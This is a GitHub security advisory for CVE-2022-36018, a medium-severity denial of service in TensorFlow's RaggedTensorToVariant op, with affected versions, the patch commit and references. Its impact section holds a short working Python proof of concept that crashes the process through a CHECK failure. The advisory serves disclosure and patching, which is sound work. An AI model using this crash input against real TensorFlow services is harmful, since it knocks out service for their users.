# [M] TensorFlow vulnerable to `CHECK` fail in `RaggedTensorToVariant`

## Summary
Severity: Medium
Advisory: GHSA-m6cv-4fmf-66xf
CVE: CVE-2022-36018
CWE: CWE-617
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2022-09-16
Source: https://github.com/advisories/GHSA-m6cv-4fmf-66xf
Type: github-advisory

## Affected
- PyPI: `tensorflow` — affected >=0 <2.7.2
- PyPI: `tensorflow` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow` — affected >=2.9.0 <2.9.1
- PyPI: `tensorflow-cpu` — affected >=0 <2.7.2
- PyPI: `tensorflow-cpu` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow-cpu` — affected >=2.9.0 <2.9.1
- PyPI: `tensorflow-gpu` — affected >=0 <2.7.2
- PyPI: `tensorflow-gpu` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow-gpu` — affected >=2.9.0 <2.9.1

## Details
### Impact
If `RaggedTensorToVariant` is given a `rt_nested_splits` list that contains tensors of ranks other than one, it results in a `CHECK` fail that can be used to trigger a denial of service attack.
```python
import tensorflow as tf

batched_input = True
rt_nested_splits = tf.constant([0,32,64], shape=[3], dtype=tf.int64)
rt_dense_values = tf.constant([0,32,64], shape=[3], dtype=tf.int64)
tf.raw_ops.RaggedTensorToVariant(rt_nested_splits=rt_nested_splits, rt_dense_values=rt_dense_values, batched_input=batched_input)
```

### Patches
We have patched the issue in GitHub commit [88f93dfe691563baa4ae1e80ccde2d5c7a143821](https://github.com/tensorflow/tensorflow/commit/88f93dfe691563baa4ae1e80ccde2d5c7a143821).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.

## References
- https://github.com/tensorflow/tensorflow/security/advisories/GHSA-m6cv-4fmf-66xf
- https://nvd.nist.gov/vuln/detail/CVE-2022-36018
- https://github.com/tensorflow/tensorflow/commit/88f93dfe691563baa4ae1e80ccde2d5c7a143821
- https://github.com/tensorflow/tensorflow
- https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0
